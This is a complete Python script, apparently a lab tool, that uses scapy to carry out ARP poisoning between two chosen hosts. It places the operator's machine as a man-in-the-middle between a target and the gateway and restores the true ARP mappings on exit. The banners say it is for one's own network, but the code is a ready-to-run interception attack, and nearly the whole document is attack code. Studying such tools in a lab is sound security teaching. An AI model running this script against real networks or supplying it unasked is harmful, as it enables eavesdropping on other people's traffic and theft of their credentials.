#!/usr/bin/env python3
"""
arp-poison-lab.py — Authorized ARP poisoning MITM lab (your own LAN only).

Performs ARP poisoning between two hosts you control to demonstrate and study
man-in-the-middle positioning. Cleans up properly on exit by restoring correct ARP
mappings to both targets.

!! Run ONLY on your own network. Use for learning and authorized lab testing only. !!

Usage:
  sudo python3 arp-poison-lab.py --target1 192.168.1.10 --target2 192.168.1.1
  sudo python3 arp-poison-lab.py --target1 192.168.1.10 --target2 192.168.1.1 --interval 1.5

This positions the attacker machine (you) between target1 and target2.
Enable IP forwarding to avoid disrupting traffic:
  sudo sysctl -w net.ipv4.ip_forward=1

Requires: pip3 install scapy
"""

import argparse
import os
import signal
import sys
import time
from datetime import datetime

try:
    from scapy.all import (
        ARP, Ether, sendp, srp, conf, get_if_hwaddr
    )
except ImportError:
    print("ERROR: scapy not installed. Run: pip3 install scapy", file=sys.stderr)
    sys.exit(1)

if os.geteuid() != 0:
    print("ERROR: Must run as root (sudo)", file=sys.stderr)
    sys.exit(1)


def get_mac(ip, iface):
    """ARP request to resolve MAC address of an IP."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface, timeout=3, verbose=0
    )
    if ans:
        return ans[0][1].hwsrc
    return None


def poison(target_ip, spoof_ip, target_mac, iface):
    """Send a gratuitous ARP reply telling target_ip that spoof_ip is at our MAC."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,           # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,  # We claim to be spoof_ip
    )
    sendp(pkt, iface=iface, verbose=0)


def restore(target_ip, real_ip, target_mac, real_mac, iface):
    """Send corrective ARP to restore the true mapping."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )
    sendp(pkt, count=5, iface=iface, verbose=0)


def main():
    parser = argparse.ArgumentParser(
        description="ARP poisoning MITM lab — authorized use on your own LAN only"
    )
    parser.add_argument("--target1", required=True, help="First target IP (e.g. 192.168.1.10)")
    parser.add_argument("--target2", required=True, help="Second target IP (e.g. 192.168.1.1 = gateway)")
    parser.add_argument("--iface", default=None, help="Network interface (auto-detect if omitted)")
    parser.add_argument("--interval", type=float, default=2.0, help="Poison interval in seconds")
    args = parser.parse_args()

    iface = args.iface or conf.iface

    print("=" * 60)
    print("  ARP POISON LAB — AUTHORIZED USE ONLY")
    print("=" * 60)
    print(f"  Target 1 : {args.target1}")
    print(f"  Target 2 : {args.target2} (usually the gateway)")
    print(f"  Interface: {iface}")
    print(f"  Interval : {args.interval}s")
    print()
    print("WARNING: Only use on your own network.")
    print("Enable IP forwarding to avoid dropping traffic:")
    print("  sudo sysctl -w net.ipv4.ip_forward=1")
    print()
    print("Resolving MAC addresses...")

    mac1 = get_mac(args.target1, iface)
    mac2 = get_mac(args.target2, iface)

    if not mac1:
        print(f"ERROR: Could not resolve MAC for {args.target1}", file=sys.stderr)
        sys.exit(1)
    if not mac2:
        print(f"ERROR: Could not resolve MAC for {args.target2}", file=sys.stderr)
        sys.exit(1)

    print(f"  {args.target1} is at {mac1}")
    print(f"  {args.target2} is at {mac2}")
    print()

    poisoning = True

    def restore_all():
        print("\nRestoring ARP tables...")
        restore(args.target1, args.target2, mac1, mac2, iface)
        restore(args.target2, args.target1, mac2, mac1, iface)
        print("Restored. You are no longer in the middle.")

    def on_exit(sig, frame):
        restore_all()
        sys.exit(0)

    signal.signal(signal.SIGINT, on_exit)
    signal.signal(signal.SIGTERM, on_exit)

    print("Poisoning started. Ctrl-C to stop and restore.\n")
    packet_count = 0

    try:
        while True:
            # Tell target1 that target2's IP is at our MAC
            poison(args.target1, args.target2, mac1, iface)
            # Tell target2 that target1's IP is at our MAC
            poison(args.target2, args.target1, mac2, iface)
            packet_count += 2
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"\r[{ts}] Poisoning... {packet_count} packets sent", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        pass
    finally:
        restore_all()


if __name__ == "__main__":
    main()
